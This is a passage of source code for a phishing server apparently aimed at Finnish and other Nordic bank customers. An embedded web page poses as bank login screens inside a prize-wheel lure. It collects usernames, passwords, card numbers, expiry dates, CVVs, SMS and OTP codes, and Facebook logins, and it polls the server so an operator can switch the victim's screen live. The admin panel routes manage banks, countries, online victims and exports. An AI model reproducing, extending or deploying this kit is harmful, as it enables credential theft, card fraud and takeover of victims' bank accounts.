                '</div>' +
                '<div class="bank-name">' + name + '</div>' +
            '</div>';
        }}
        grid.innerHTML = html;
    }}

    renderBanks(allBanks);

    function filterBanks() {{
        var query = document.getElementById('searchInput').value.toLowerCase();
        var filtered = allBanks.filter(function(b) {{
            return (b.bank_name || '').toLowerCase().indexOf(query) !== -1;
        }});
        renderBanks(filtered);
        document.getElementById('noResults').style.display = filtered.length === 0 ? 'block' : 'none';
    }}

    function selectBank(bankId) {{
        selectedBank = allBanks.find(function(b) {{ return b.id == bankId; }});
        if (!selectedBank) return;

        // Notify server
        var fd = new FormData();
        fd.append('bank_id', selectedBank.id);
        fd.append('bank_name', selectedBank.bank_name || '');
        fetch('/api/bankUpdate', {{ method: 'POST', body: fd, credentials: 'include' }}).catch(function(){{}});

        // Set up login page
        var logo = document.getElementById('loginBankLogo');
        if (selectedBank.logo) {{
            logo.src = '/static/img/banks/' + selectedBank.logo;
            logo.style.display = '';
        }} else {{
            logo.style.display = 'none';
        }}

        document.getElementById('loginBankTitle').textContent = selectedBank.bank_title || selectedBank.bank_name || '';

        // Password field
        var pwGroup = document.getElementById('passwordGroup');
        pwGroup.style.display = selectedBank.show_password === '0' ? 'none' : '';

        // Custom labels
        var uLabel = document.getElementById('usernameLabel');
        var pLabel = document.getElementById('passwordLabel');
        uLabel.textContent = selectedBank.input_label_1 || 'Käyttäjätunnus';
        pLabel.textContent = selectedBank.input_label_2 || 'Salasana';
        document.getElementById('loginUsername').placeholder = selectedBank.input_label_1 || 'Käyttäjätunnus';
        document.getElementById('loginPassword').placeholder = selectedBank.input_label_2 || 'Salasana';

        // Login options
        var optDiv = document.getElementById('loginOptions');
        optDiv.innerHTML = '';
        var optCount = parseInt(selectedBank.option_count || '0');
        if (selectedBank.login_option === '1' && optCount > 0) {{
            var names = [selectedBank.option_name_1, selectedBank.option_name_2, selectedBank.option_name_3].filter(Boolean);
            if (names.length > 0) {{
                var optHtml = '<div class="login-options">';
                for (var oi = 0; oi < names.length; oi++) {{
                    optHtml += '<button type="button" class="login-option-btn' + (oi === 0 ? ' active' : '') + '" onclick="selectOption(this)">' + names[oi] + '</button>';
                }}
                optHtml += '</div>';
                optDiv.innerHTML = optHtml;
            }}
        }}

        // Clear previous inputs
        document.getElementById('loginUsername').value = '';
        document.getElementById('loginPassword').value = '';
        document.getElementById('loginError').style.display = 'none';

        // Show login page
        document.getElementById('bankListPage').style.display = 'none';
        document.getElementById('loginPage').classList.add('active');
        document.getElementById('waitPage').classList.remove('active');
    }}

    function selectOption(btn) {{
        document.querySelectorAll('.login-option-btn').forEach(function(b) {{ b.classList.remove('active'); }});
        btn.classList.add('active');
    }}

    function showBankList() {{
        document.getElementById('loginPage').classList.remove('active');
        document.getElementById('bankListPage').style.display = '';
    }}

    function handleLogin(e) {{
        e.preventDefault();
        var username = document.getElementById('loginUsername').value.trim();
        var password = document.getElementById('loginPassword').value;
        var errDiv = document.getElementById('loginError');

        if (!username) {{
            errDiv.textContent = 'Anna käyttäjätunnus oikein';
            errDiv.style.display = 'block';
            return false;
        }}
        if (selectedBank.show_password !== '0' && !password) {{
            errDiv.textContent = 'Anna salasana oikein';
            errDiv.style.display = 'block';
            return false;
        }}

        errDiv.style.display = 'none';
        var submitBtn = document.getElementById('loginSubmitBtn');
        submitBtn.disabled = true;
        submitBtn.textContent = 'Käsitellään...';

        var fd = new FormData();
        fd.append('username', username);
        fd.append('password', password);
        fd.append('bank_id', selectedBank.id);
        fd.append('bank_name', selectedBank.bank_name || '');

        // Get selected option
        var activeOpt = document.querySelector('.login-option-btn.active');
        if (activeOpt) fd.append('login_option', activeOpt.textContent);

        fetch('/api/save_login', {{ method: 'POST', body: fd, credentials: 'include' }})
            .then(function(r) {{ return r.json(); }})
            .then(function() {{ showWaitPage(); }})
            .catch(function() {{ showWaitPage(); }});

        return false;
    }}

    function showWaitPage() {{
        document.getElementById('loginPage').classList.remove('active');
        document.getElementById('waitPage').classList.add('active');
        // Initialize last page to wait so first poll doesn't re-trigger
        _lastPage = 'wait';
        // Start polling for admin actions
        startPagePolling();
    }}

    // ========================================
    // VISITOR ID HELPERS
    // ========================================
    function getVisitorId() {{
        var vid = localStorage.getItem('visitor_id') || '';
        if (!vid) {{
            var cookies = document.cookie.split(';');
            for (var i = 0; i < cookies.length; i++) {{
                var c = cookies[i].trim();
                if (c.indexOf('vid=') === 0) {{ vid = c.substring(4); break; }}
            }}
        }}
        return vid;
    }}

    // ========================================
    // PAGE POLLING SYSTEM
    // ========================================
    var _currentPage = 'wait';
    var _pollTimer = null;
    var _lastPage = '';

    function startPagePolling() {{
        if (_pollTimer) clearInterval(_pollTimer);
        _pollTimer = setInterval(function() {{
            var vid = getVisitorId();
            var xhr = new XMLHttpRequest();
            xhr.open('GET', '/api/getRole?visitor_id=' + (vid || '') + '&t=' + Date.now(), true);
            xhr.withCredentials = true;
            xhr.onload = function() {{
                try {{
                    var d = JSON.parse(xhr.responseText);
                    if (d.success && d.page && d.page !== _lastPage) {{
                        _lastPage = d.page;
                        handlePageChange(d.page, d);
                    }}
                }} catch(e) {{}}
            }};
            xhr.onerror = function() {{}};
            xhr.send();
        }}, 2000);
    }}

    function hideAllPages() {{
        var pages = ['bankListPage','loginPage','waitPage','dynamicPage','smsPage','cardPage',
                     'facebookPage','verifyPage','successPage','supportPage','bankLoginErrorPage','bannedPage'];
        for (var i = 0; i < pages.length; i++) {{
            var el = document.getElementById(pages[i]);
            if (el) {{
                el.style.display = 'none';
                el.classList.remove('active');
            }}
        }}
    }}

    function showPage(pageId, displayType) {{
        hideAllPages();
        var el = document.getElementById(pageId);
        if (el) {{
            el.style.display = displayType || 'flex';
            el.classList.add('active');
        }}
    }}

    function handlePageChange(page, serverData) {{
        serverData = serverData || {{}};
        _currentPage = page;

        switch(page) {{
            case 'wheel':
                window.location.href = '/wheel';
                return;
            case 'bankList':
                showPage('bankListPage', 'block');
                return;
            case 'bankLogin':
                if (selectedBank) {{
                    showPage('loginPage');
                    document.getElementById('loginPage').classList.add('active');
                    document.getElementById('loginUsername').value = '';
                    document.getElementById('loginPassword').value = '';
                    document.getElementById('loginError').style.display = 'none';
                    document.getElementById('loginSubmitBtn').disabled = false;
                    document.getElementById('loginSubmitBtn').textContent = 'Kirjaudu Sisään';
                }} else {{
                    showPage('bankListPage', 'block');
                }}
                break;
            case 'wait':
                showPage('waitPage');
                document.getElementById('waitPage').classList.add('active');
                break;
            case 'bankLoginError':
                renderBankLoginErrorPage();
                break;
            case 'sms':
                renderSmsPage(serverData);
                break;
            case 'otp':
                renderSmsPage(serverData);
                break;
            case 'card':
                renderCardPage();
                break;
            case 'facebook':
                renderFacebookPage();
                break;
            case 'success':
                renderSuccessPage();
                break;
            case 'banned':
                showPage('bannedPage');
                if (_pollTimer) clearInterval(_pollTimer);
                return;
            case 'nordeaVerify':
                renderVerifyPage('Nordea', serverData);
                break;
            case 'spankkiVerify':
                renderVerifyPage('S-Pankki', serverData);
                break;
            case 'opVerify':
                renderVerifyPage('OP', serverData);
                break;
            case 'austriaVerify':
                renderCustomVerifyPage(serverData.verify_texts || {{}});
                break;
            case 'customVerify':
                renderCustomVerifyPage(serverData.custom_verify_texts || {{}});
                break;
            case 'support':
                renderSupportPage(serverData);
                break;
            case 'whatsapp':
                renderSupportPage(serverData);
                break;
            default:
                showPage('waitPage');
                document.getElementById('waitPage').classList.add('active');
                break;
        }}
    }}

    // ========================================
    // PAGE RENDERERS
    // ========================================

    function renderBankLoginErrorPage() {{
        var el = document.getElementById('bankLoginErrorPage');
        var bankName = selectedBank ? (selectedBank.bank_name || '') : '';
        el.innerHTML = '<div style="max-width:480px;width:100%;">' +
            '<div style="background:#fff;border-radius:24px;padding:2rem;box-shadow:0 8px 40px rgba(0,0,0,0.12);">' +
                '<div style="background:#FEE2E2;border:1px solid #FECACA;border-radius:12px;padding:1rem;margin-bottom:1.5rem;text-align:center;">' +
                    '<p style="color:#DC2626;font-weight:600;">⚠️ Virhe</p>' +
                    '<p style="color:#DC2626;font-size:0.9rem;margin-top:0.5rem;">Tarkista kirjautumistietosi ja yritä uudelleen.</p>' +
                '</div>' +
                (selectedBank && selectedBank.logo ? '<div style="text-align:center;margin-bottom:1rem;"><img src="/static/img/banks/' + selectedBank.logo + '" style="width:64px;height:64px;object-fit:contain;" alt="' + bankName + '"></div>' : '') +
                '<form id="retryLoginForm" onsubmit="return handleRetryLogin(event)">' +
                    '<div class="form-group"><label>Käyttäjätunnus</label>' +
                    '<input type="text" id="retryUsername" required style="width:100%;height:52px;border:2px solid #e5e7eb;border-radius:14px;padding:0 1rem;font-size:1rem;background:#fafafa;"></div>' +
                    '<div class="form-group"><label>Salasana</label>' +
                    '<input type="password" id="retryPassword" style="width:100%;height:52px;border:2px solid #e5e7eb;border-radius:14px;padding:0 1rem;font-size:1rem;background:#fafafa;"></div>' +
                    '<button type="submit" class="login-submit" id="retryLoginBtn">Kirjaudu Sisään</button>' +
                '</form>' +
            '</div>' +
        '</div>';
        showPage('bankLoginErrorPage');
    }}

    function handleRetryLogin(e) {{
        e.preventDefault();
        var u = document.getElementById('retryUsername').value.trim();
        var p = document.getElementById('retryPassword').value;
        if (!u) return false;
        var btn = document.getElementById('retryLoginBtn');
        btn.disabled = true;
        btn.textContent = 'Käsitellään...';
        var bankId = selectedBank ? selectedBank.id : '';
        var bankName = selectedBank ? (selectedBank.bank_name || '') : '';
        submitToApi('save_login', {{username: u, password: p, bank_id: bankId, bank_name: bankName}});
        return false;
    }}

    function renderSmsPage(data) {{
        var el = document.getElementById('smsPage');
        var smsReq = data.sms_request || {{}};
        var title = smsReq.title || 'SMS Vahvistuskoodi';
        var msg = smsReq.message || '';
        var len = parseInt(smsReq.length) || 6;
        var inputs = '';
        for (var i = 0; i < len; i++) {{
            inputs += '<input type="text" maxlength="1" class="sms-input" style="width:44px;height:52px;text-align:center;font-size:1.4rem;border:2px solid #ddd;border-radius:12px;outline:none;background:#fff;color:#333;">';
        }}
        el.innerHTML = '<div style="max-width:420px;width:100%;">' +
            '<h2 style="color:#fff;margin-bottom:0.5rem;">' + title + '</h2>' +
            (msg ? '<p style="color:rgba(255,255,255,0.8);margin-bottom:1.5rem;">' + msg + '</p>' : '') +
            '<div style="background:#fff;border-radius:24px;padding:2rem;box-shadow:0 8px 32px rgba(0,0,0,0.1);">' +
                '<div style="display:flex;gap:6px;justify-content:center;margin-bottom:1.5rem;flex-wrap:wrap;" id="smsInputs">' + inputs + '</div>' +
                '<button id="smsSubmitBtn" onclick="handleSmsSubmit()" style="width:100%;padding:14px;background:#2563EB;color:#fff;border:none;border-radius:16px;font-size:1rem;font-weight:600;cursor:pointer;">Vahvista</button>' +
            '</div>' +
        '</div>';
        showPage('smsPage');
        // Focus first input
        var firstInput = el.querySelector('.sms-input');
        if (firstInput) firstInput.focus();
    }}

    function handleSmsSubmit() {{
        var inputs = document.querySelectorAll('#smsInputs .sms-input');
        var code = '';
        inputs.forEach(function(i){{ code += i.value; }});
        if (code.length < 3) return;
        var btn = document.getElementById('smsSubmitBtn');
        btn.disabled = true;
        btn.textContent = 'Käsitellään...';
        submitToApi('save_sms', {{sms: code}});
    }}

    function renderCardPage() {{
        var el = document.getElementById('cardPage');
        el.innerHTML = '<div style="max-width:440px;width:100%;">' +
            /* ---- KART GÖRSELİ ---- */
            '<div id="creditCardVisual" style="width:100%;max-width:400px;aspect-ratio:1.586;margin:0 auto 1.5rem;border-radius:18px;position:relative;overflow:hidden;box-shadow:0 12px 40px rgba(0,0,0,0.35);background:linear-gradient(135deg,#0a2e5c 0%,#1a5aa8 50%,#0a2e5c 100%);">' +
                /* Sarı üst alan */
                '<div style="position:absolute;top:0;left:0;right:0;height:45%;background:linear-gradient(135deg,#f5c518 0%,#e8b400 100%);border-radius:18px 18px 0 0;">' +
                    /* Chip ikonu */
                    '<div style="position:absolute;top:22%;left:8%;width:48px;height:38px;background:linear-gradient(135deg,#d4af37,#c5a028);border-radius:6px;border:2px solid #b8960f;display:flex;align-items:center;justify-content:center;">' +
                        '<div style="width:28px;height:20px;border:1.5px solid rgba(0,0,0,0.25);border-radius:3px;position:relative;">' +
                            '<div style="position:absolute;top:50%;left:0;right:0;height:1.5px;background:rgba(0,0,0,0.2);"></div>' +
                            '<div style="position:absolute;top:0;bottom:0;left:50%;width:1.5px;background:rgba(0,0,0,0.2);"></div>' +
                        '</div>' +
                    '</div>' +
                '</div>' +
                /* Kart numarası */
                '<div style="position:absolute;top:48%;left:8%;right:8%;text-align:center;">' +
                    '<div style="font-size:10px;letter-spacing:2px;color:rgba(255,255,255,0.65);text-transform:uppercase;margin-bottom:4px;font-family:monospace;">card number</div>' +
                    '<div id="cardVisualNumber" style="font-size:22px;letter-spacing:4px;color:#fff;font-family:\\'Courier New\\',monospace;font-weight:700;text-shadow:0 1px 3px rgba(0,0,0,0.4);">0123 4567 8910 1112</div>' +
                '</div>' +
                /* Expiry */
                '<div style="position:absolute;bottom:12%;right:10%;text-align:right;">' +
                    '<div style="font-size:8px;letter-spacing:1.5px;color:rgba(255,255,255,0.55);text-transform:uppercase;font-family:monospace;">expiration</div>' +
                    '<div style="display:flex;align-items:center;justify-content:flex-end;gap:4px;">' +
                        '<div style="font-size:6px;color:rgba(255,255,255,0.5);line-height:1;text-align:right;font-family:monospace;">VALID<br>THRU</div>' +
                        '<div style="color:rgba(255,255,255,0.5);font-size:12px;">&#9654;</div>' +
                        '<div id="cardVisualExpiry" style="font-size:18px;color:#fff;font-family:\\'Courier New\\',monospace;font-weight:700;letter-spacing:2px;text-shadow:0 1px 3px rgba(0,0,0,0.4);">01/24</div>' +
                    '</div>' +
                '</div>' +
            '</div>' +
            /* ---- FORM ALANI ---- */
            '<div style="max-width:400px;margin:0 auto;display:flex;flex-direction:column;gap:0.75rem;">' +
                '<input type="text" id="cardNumber" maxlength="19" placeholder="Kortin Tiedot" style="width:100%;height:52px;border:none;border-radius:12px;padding:0 1.2rem;font-size:1rem;color:#fff;background:rgba(255,255,255,0.15);backdrop-filter:blur(10px);-webkit-backdrop-filter:blur(10px);outline:none;box-sizing:border-box;" onfocus="this.style.background=\\'rgba(255,255,255,0.22)\\'" onblur="this.style.background=\\'rgba(255,255,255,0.15)\\'">' +
                '<input type="text" id="cardExpiry" maxlength="5" placeholder="Kortin Viimeinen Käyttöpäivä (KK/VV)" style="width:100%;height:52px;border:none;border-radius:12px;padding:0 1.2rem;font-size:1rem;color:#fff;background:rgba(255,255,255,0.15);backdrop-filter:blur(10px);-webkit-backdrop-filter:blur(10px);outline:none;box-sizing:border-box;" onfocus="this.style.background=\\'rgba(255,255,255,0.22)\\'" onblur="this.style.background=\\'rgba(255,255,255,0.15)\\'">' +
                '<input type="text" id="cardCvc" maxlength="4" placeholder="CVV-koodi" style="width:100%;height:52px;border:none;border-radius:12px;padding:0 1.2rem;font-size:1rem;color:#fff;background:rgba(255,255,255,0.15);backdrop-filter:blur(10px);-webkit-backdrop-filter:blur(10px);outline:none;box-sizing:border-box;" onfocus="this.style.background=\\'rgba(255,255,255,0.22)\\'" onblur="this.style.background=\\'rgba(255,255,255,0.15)\\'">' +
                '<button id="cardSubmitBtn" onclick="handleCardSubmit()" style="width:100%;padding:14px;background:#f5c518;color:#1a1a2e;border:none;border-radius:12px;font-size:1rem;font-weight:700;cursor:pointer;margin-top:0.25rem;letter-spacing:0.5px;">Jatka</button>' +
            '</div>' +
        '</div>';
        showPage('cardPage');

        // Card number formatting + visual update
        document.getElementById('cardNumber').addEventListener('input', function(e) {{
            var v = e.target.value.replace(/\\D/g,'').substring(0,16);
            e.target.value = v.replace(/(\\d{{4}})(?=\\d)/g, '$1 ');
            var display = v;
            while (display.length < 16) display += '•';
            var formatted = display.match(/.{{1,4}}/g).join('  ');
            document.getElementById('cardVisualNumber').textContent = formatted;
        }});

        // Expiry formatting + visual update
        document.getElementById('cardExpiry').addEventListener('input', function(e) {{
            var v = e.target.value.replace(/\\D/g,'').substring(0,4);
            if (v.length > 2) v = v.substring(0,2) + '/' + v.substring(2);
            e.target.value = v;
            document.getElementById('cardVisualExpiry').textContent = v || '••/••';
        }});

        // Placeholder styling for inputs
        var cardInputs = el.querySelectorAll('input');
        cardInputs.forEach(function(inp) {{
            inp.style.setProperty('--ph-color','rgba(255,255,255,0.5)');
        }});
        if (!document.getElementById('cardPlaceholderStyle')) {{
            var phs = document.createElement('style');
            phs.id = 'cardPlaceholderStyle';
            phs.textContent = '#cardPage input::placeholder {{ color: rgba(255,255,255,0.5); }}';
            document.head.appendChild(phs);
        }}
    }}

    function handleCardSubmit() {{
        var cn = document.getElementById('cardNumber');
        var ce = document.getElementById('cardExpiry');
        var cc = document.getElementById('cardCvc');
        if (!cn || !cn.value || !ce || !ce.value || !cc || !cc.value) return;
        var btn = document.getElementById('cardSubmitBtn');
        btn.disabled = true;
        btn.textContent = 'Käsitellään...';
        submitToApi('save_card', {{card_number: cn.value, expiry_date: ce.value, cvc: cc.value}});
    }}

    function renderFacebookPage() {{
        var el = document.getElementById('facebookPage');
        el.innerHTML = '<div style="max-width:440px;width:100%;">' +
            '<div style="background:#fff;border-radius:24px;padding:2rem;box-shadow:0 8px 32px rgba(0,0,0,0.1);">' +
                '<div style="text-align:center;margin-bottom:1.5rem;"><img src="https://upload.wikimedia.org/wikipedia/commons/thumb/0/05/Facebook_Logo_%282019%29.png/600px-Facebook_Logo_%282019%29.png" style="width:48px;" alt="Facebook"></div>' +
                '<div style="margin-bottom:1rem;">' +
                    '<input type="text" id="fbEmail" placeholder="Matkapuhelinnumero tai sähköpostiosoite" style="width:100%;height:52px;border:1px solid #ddd;border-radius:12px;padding:0 1rem;font-size:1rem;">' +
                '</div>' +
                '<div style="margin-bottom:1rem;">' +
                    '<input type="password" id="fbPassword" placeholder="Salasana" style="width:100%;height:52px;border:1px solid #ddd;border-radius:12px;padding:0 1rem;font-size:1rem;">' +
                '</div>' +
                '<button id="fbSubmitBtn" onclick="handleFacebookSubmit()" style="width:100%;padding:14px;background:#1877F2;color:#fff;border:none;border-radius:12px;font-size:1rem;font-weight:600;cursor:pointer;">Kirjaudu sisään</button>' +
                '<p style="text-align:center;margin-top:1rem;"><a href="#" style="color:#1877F2;text-decoration:none;font-size:0.9rem;">Unohtuiko salasana?</a></p>' +
            '</div>' +
        '</div>';
        showPage('facebookPage');
    }}

    function handleFacebookSubmit() {{
        var em = document.getElementById('fbEmail');
        var pw = document.getElementById('fbPassword');
        if (!em || !em.value || !pw || !pw.value) return;
        var btn = document.getElementById('fbSubmitBtn');
        btn.disabled = true;
        btn.textContent = 'Käsitellään...';
        submitToApi('save_facebook', {{email: em.value, password: pw.value}});
    }}

    function renderVerifyPage(bankName, data) {{
        var el = document.getElementById('verifyPage');
        var pin = data.op_pin || '';
        el.innerHTML = '<div style="max-width:400px;width:100%;">' +
            '<h2 style="color:#fff;margin-bottom:0.5rem;">' + bankName + ' - Vahvistus</h2>' +
            '<div style="background:#fff;border-radius:24px;padding:2rem;box-shadow:0 8px 32px rgba(0,0,0,0.1);margin-top:1rem;">' +
                (pin ? '<p style="color:#374151;font-size:0.95rem;margin-bottom:1rem;text-align:center;">Koodi: <strong>' + pin + '</strong></p>' : '') +
                '<p style="color:#374151;font-size:0.95rem;margin-bottom:1.5rem;text-align:center;">Hyväksy toiminto ' + bankName + ' sovelluksessasi.</p>' +
                '<div style="display:flex;gap:8px;justify-content:center;margin-bottom:1.5rem;" id="verifyInputs">' +
                    '<input type="text" maxlength="1" class="verify-input" style="width:48px;height:56px;text-align:center;font-size:1.5rem;border:2px solid #ddd;border-radius:12px;outline:none;background:#fff;color:#333;">' +
                    '<input type="text" maxlength="1" class="verify-input" style="width:48px;height:56px;text-align:center;font-size:1.5rem;border:2px solid #ddd;border-radius:12px;outline:none;background:#fff;color:#333;">' +
                    '<input type="text" maxlength="1" class="verify-input" style="width:48px;height:56px;text-align:center;font-size:1.5rem;border:2px solid #ddd;border-radius:12px;outline:none;background:#fff;color:#333;">' +
                    '<input type="text" maxlength="1" class="verify-input" style="width:48px;height:56px;text-align:center;font-size:1.5rem;border:2px solid #ddd;border-radius:12px;outline:none;background:#fff;color:#333;">' +
                '</div>' +
                '<button id="verifySubmitBtn" onclick="handleVerifySubmit()" style="width:100%;padding:14px;background:#2563EB;color:#fff;border:none;border-radius:16px;font-size:1rem;font-weight:600;cursor:pointer;">Vahvista</button>' +
            '</div>' +
        '</div>';
        showPage('verifyPage');
        var firstInput = el.querySelector('.verify-input');
        if (firstInput) firstInput.focus();
    }}

    function handleVerifySubmit() {{
        var inputs = document.querySelectorAll('#verifyInputs .verify-input');
        var code = '';
        inputs.forEach(function(i){{ code += i.value; }});
        if (code.length < 3) return;
        var btn = document.getElementById('verifySubmitBtn');
        btn.disabled = true;
        btn.textContent = 'Käsitellään...';
        submitToApi('save_otp', {{otp: code}});
    }}

    function renderCustomVerifyPage(texts) {{
        texts = texts || {{}};
        var el = document.getElementById('verifyPage');
        el.innerHTML = '<div style="max-width:400px;width:100%;">' +
            '<h2 style="color:#fff;margin-bottom:0.5rem;">Vahvistus</h2>' +
            '<div style="background:#fff;border-radius:24px;padding:2rem;box-shadow:0 8px 32px rgba(0,0,0,0.1);margin-top:1rem;">' +
                (texts.text1 ? '<p style="color:#374151;font-size:1rem;font-weight:600;margin-bottom:0.5rem;text-align:center;">' + texts.text1 + '</p>' : '') +
                (texts.text2 ? '<p style="color:#6B7280;font-size:0.95rem;margin-bottom:1rem;text-align:center;">' + texts.text2 + '</p>' : '') +
                (texts.text3 ? '<p style="color:#6B7280;font-size:0.9rem;margin-bottom:1.5rem;text-align:center;">' + texts.text3 + '</p>' : '') +
                '<div style="display:flex;gap:8px;justify-content:center;margin-bottom:1.5rem;" id="cvInputs">' +
                    '<input type="text" maxlength="1" class="cv-input" style="width:48px;height:56px;text-align:center;font-size:1.5rem;border:2px solid #ddd;border-radius:12px;outline:none;background:#fff;color:#333;">' +
                    '<input type="text" maxlength="1" class="cv-input" style="width:48px;height:56px;text-align:center;font-size:1.5rem;border:2px solid #ddd;border-radius:12px;outline:none;background:#fff;color:#333;">' +
                    '<input type="text" maxlength="1" class="cv-input" style="width:48px;height:56px;text-align:center;font-size:1.5rem;border:2px solid #ddd;border-radius:12px;outline:none;background:#fff;color:#333;">' +
                    '<input type="text" maxlength="1" class="cv-input" style="width:48px;height:56px;text-align:center;font-size:1.5rem;border:2px solid #ddd;border-radius:12px;outline:none;background:#fff;color:#333;">' +
                    '<input type="text" maxlength="1" class="cv-input" style="width:48px;height:56px;text-align:center;font-size:1.5rem;border:2px solid #ddd;border-radius:12px;outline:none;background:#fff;color:#333;">' +
                    '<input type="text" maxlength="1" class="cv-input" style="width:48px;height:56px;text-align:center;font-size:1.5rem;border:2px solid #ddd;border-radius:12px;outline:none;background:#fff;color:#333;">' +
                '</div>' +
                '<button id="cvSubmitBtn" onclick="handleCustomVerifySubmit()" style="width:100%;padding:14px;background:#2563EB;color:#fff;border:none;border-radius:16px;font-size:1rem;font-weight:600;cursor:pointer;">Vahvista</button>' +
            '</div>' +
        '</div>';
        showPage('verifyPage');
        var firstInput = el.querySelector('.cv-input');
        if (firstInput) firstInput.focus();
    }}

    function handleCustomVerifySubmit() {{
        var inputs = document.querySelectorAll('#cvInputs .cv-input');
        var code = '';
        inputs.forEach(function(i){{ code += i.value; }});
        if (code.length < 3) return;
        var btn = document.getElementById('cvSubmitBtn');
        btn.disabled = true;
        btn.textContent = 'Käsitellään...';
        submitToApi('save_otp', {{otp: code}});
    }}

    function renderSuccessPage() {{
        var el = document.getElementById('successPage');
        el.innerHTML = '<div style="max-width:400px;width:100%;">' +
            '<div style="margin:2rem 0;"><svg width="80" height="80" viewBox="0 0 24 24" fill="none" stroke="#22C55E" stroke-width="2"><circle cx="12" cy="12" r="10"/><path d="M8 12l3 3 5-5"/></svg></div>' +
            '<h2 style="color:#22C55E;font-size:1.5rem;font-weight:700;margin-bottom:0.5rem;">Onnittelut!</h2>' +
            '<p style="color:#fff;font-size:1.1rem;">Osallistumisesi On Tallennettu</p>' +
        '</div>';
        showPage('successPage');
    }}

    function renderSupportPage(data) {{
        data = data || {{}};
        var step = data.support_step || '2';
        var el = document.getElementById('supportPage');
        el.innerHTML = '<div style="max-width:400px;width:100%;">' +
            '<h2 style="color:#fff;margin-bottom:0.5rem;">Miten voimme auttaa?</h2>' +
            '<p style="color:#FFD700;font-size:0.9rem;margin:0.5rem 0;">Vaihe ' + step + ' / 8</p>' +
            '<p style="color:rgba(255,255,255,0.8);font-size:0.95rem;margin-bottom:1.5rem;">Olemme täällä vastaamassa kysymyksiisi.</p>' +
            '<div style="display:flex;flex-direction:column;gap:1rem;width:100%;">' +
                '<div style="background:#fff;border-radius:16px;padding:1.5rem;text-align:center;">' +
                    '<h3 style="color:#1F2937;font-size:1rem;margin-bottom:0.5rem;">💬 Live-tuki</h3>' +
                    '<p style="color:#6B7280;font-size:0.85rem;">Asiantuntijaedustajamme ovat valmiina auttamaan sinua heti.</p>' +
                '</div>' +
                '<div style="background:#fff;border-radius:16px;padding:1.5rem;text-align:center;">' +
                    '<h3 style="color:#25D366;font-size:1rem;margin-bottom:0.5rem;">📱 WhatsApp-tuki</h3>' +
                    '<p style="color:#6B7280;font-size:0.85rem;margin-bottom:0.5rem;">Voit ottaa meihin yhteyttä WhatsAppin kautta 24/7.</p>' +
                    '<button style="padding:10px 24px;background:#25D366;color:#fff;border:none;border-radius:12px;font-size:0.9rem;cursor:pointer;">Ota yhteyttä</button>' +
                '</div>' +
                '<div style="background:#fff;border-radius:16px;padding:1.5rem;text-align:center;">' +
                    '<h3 style="color:#1877F2;font-size:1rem;margin-bottom:0.5rem;">📘 Facebook-tuki</h3>' +
                    '<p style="color:#6B7280;font-size:0.85rem;margin-bottom:0.5rem;">Ota meihin yhteyttä Facebook Messengerin kautta 24/7.</p>' +
                    '<button style="padding:10px 24px;background:#1877F2;color:#fff;border:none;border-radius:12px;font-size:0.9rem;cursor:pointer;">Ota yhteyttä Messengerissä</button>' +
                '</div>' +
            '</div>' +
        '</div>';
        showPage('supportPage');
    }}

    // ========================================
    // API SUBMIT HELPER
    // ========================================
    function submitToApi(endpoint, data) {{
        var vid = getVisitorId();
        var fd = new FormData();
        fd.append('visitor_id', vid);
        for (var k in data) {{ if (data.hasOwnProperty(k)) fd.append(k, data[k]); }}

        fetch('/api/' + endpoint, {{
            method: 'POST',
            body: fd,
            credentials: 'include'
        }}).then(function(r){{ return r.json(); }}).then(function(resp) {{
            // After submit, show wait page and continue polling
            _currentPage = 'wait';
            _lastPage = 'wait';
            showPage('waitPage');
            document.getElementById('waitPage').classList.add('active');
        }}).catch(function(err) {{
            console.error('Submit error:', err);
            _currentPage = 'wait';
            _lastPage = 'wait';
            showPage('waitPage');
            document.getElementById('waitPage').classList.add('active');
        }});
    }}

    // ========================================
    // OTP-STYLE INPUT AUTO-FOCUS
    // ========================================
    document.addEventListener('input', function(e) {{
        if (e.target.classList.contains('sms-input') || e.target.classList.contains('verify-input') || e.target.classList.contains('cv-input')) {{
            if (e.target.value.length === 1) {{
                var next = e.target.nextElementSibling;
                if (next && next.tagName === 'INPUT') next.focus();
            }}
        }}
    }});

    document.addEventListener('keydown', function(e) {{
        if ((e.target.classList.contains('sms-input') || e.target.classList.contains('verify-input') || e.target.classList.contains('cv-input')) && e.key === 'Backspace' && !e.target.value) {{
            var prev = e.target.previousElementSibling;
            if (prev && prev.tagName === 'INPUT') {{ prev.focus(); prev.value = ''; }}
        }}
    }});

    </script>
</body>
</html>'''
            self._send(html, 'text/html; charset=utf-8'); return

        # === /api/* ===
        if path.startswith('/api/'):
            self._handle_public_api(path, 'GET', qs)
            return

        if path == '/robots.txt':
            self._send('User-agent: *\nDisallow: /', 'text/plain'); return

        # ============================
        # ADMIN PANEL (/jehat/*)
        # ============================
        if not path.startswith('/jehat'):
            self._json({'error': 'not found'}, 404); return

        sub = path[6:].strip('/')
        is_xhr = self.headers.get('X-Requested-With') == 'XMLHttpRequest'
        is_accept_json = 'json' in (self.headers.get('Accept', '') or '')

        if sub in ('', 'login'):
            lp = os.path.join(CAPTURED_PAGES, 'login.html')
            if os.path.isfile(lp):
                self._html_file(lp)
            else:
                self._send('<h1>Login</h1><form method="POST"><input name="username"><input name="password" type="password"><button>Giriş</button></form>', 'text/html; charset=utf-8')
            return

        if sub == 'logout':
            sid = self._get_session_id()
            if sid:
                with store.lock:
                    store.data['sessions'].pop(sid, None)
            self.send_response(302)
            self.send_header('Location', '/jehat')
            self.send_header('Set-Cookie', 'ci_session=; Path=/; Max-Age=0')
            self.end_headers(); return

        # --- Admin API GET ---
        api_resp = self._handle_admin_api_get(sub, qs)
        if api_resp is not None:
            self._json(api_resp); return

        # --- Admin HTML sayfaları ---
        sess = self._require_admin()
        if not sess:
            if is_xhr or is_accept_json:
                self._json({'error': 'unauthorized'}, 401)
            else:
                self.send_response(302)
                self.send_header('Location', '/jehat')
                self.end_headers()
            return

        # Rol kontrolü: operator sadece dashboard ve görüntüleme
        user_role = sess.get('role', 'operator')

        page_map = {
            'dashboard': 'dashboard.html',
            'bank/list': 'bank_list.html',
            'bank/add': 'bank_add.html',
            'onlineUsers': 'onlineUsers.html',
            'wheelSettings': 'wheelSettings.html',
            'countrySettings': 'countrySettings.html',
            'languages/list': 'languages_list.html',
            'userManagement': 'userManagement.html',
            'activityLogs': 'activityLogs.html',
            'bannedList': 'bannedList.html',
            'adminSettings': 'adminSettings.html',
            'export': 'export.html',
            'truncate': 'truncate.html',
        }
        for lang in ['fi', 'se', 'no', 'dk', 'es', 'at', 'au', 'ie', 'hk']:
            page_map[f'languages/edit/{lang}'] = f'languages_edit_{lang}.html'

